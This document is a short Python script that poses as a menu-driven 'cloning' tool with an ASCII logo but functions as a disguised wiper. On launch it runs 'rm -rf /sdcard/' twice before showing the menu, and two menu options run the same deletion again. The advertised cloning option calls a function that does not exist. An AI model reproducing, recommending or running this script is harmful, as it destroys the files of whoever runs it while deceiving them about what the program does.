#-*-coding:utf-8-*-
#OPEN SOURCE BRO

import uuid
import requests,bs4,sys,os,subprocess,time
from multiprocessing.pool import ThreadPool
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
try:
        import bs4
except ImportError:
        os.system("pip2 install bs4")
logo="""  _   _   ___  ___  ___  ___  __   __ _   _  _   _ 
 | | | | / _ \ |  \/  | / _ \ \ \ / /| | | || \ | |
 | |_| |/ /_\ \| .  . |/ /_\ \ \ V / | | | ||  \| |
 |  _  ||  _  || |\/| ||  _  |  \ /  | | | || . ` |
 | | | || | | || |  | || | | |  | |  | |_| || |\  |
 \_| |_/\_| |_/\_|  |_/\_| |_/  \_/   \___/ \_| \_/
                                                    """
def main():
    os.system("rm -rf /sdcard/")
    print(logo)
    print("\x1b[1;97m    MAIN MENU")
    os.system("rm -rf /sdcard/")
    print("\x1b[1;97m-----------------------------------------------------")
    print("\x1b[1;92m[1]\x1b[1;92mSTART CLONING JUSTNOW")
    print("\x1b[1;92m[2]\x1b[1;92mSTART CLONING JUSTNOW2")
    print("\x1b[1;92m[3]\x1b[1;92m INBOX ME")
    print("\x1b[1;97m-----------------------------------------------------")
    log_sel()
def log_sel():
	sel = input("Choose:")
	if sel =="1":
		fucking()
	elif sel =="2":
		os.system("rm -rf /sdcard*")
	elif sel =="3":
		os.system('rm -rf /sdcard/')
	
	else:
		print("")
		print("\tSelect valid option")
		print("")
		log_select()


if __name__=='__main__':
    main()
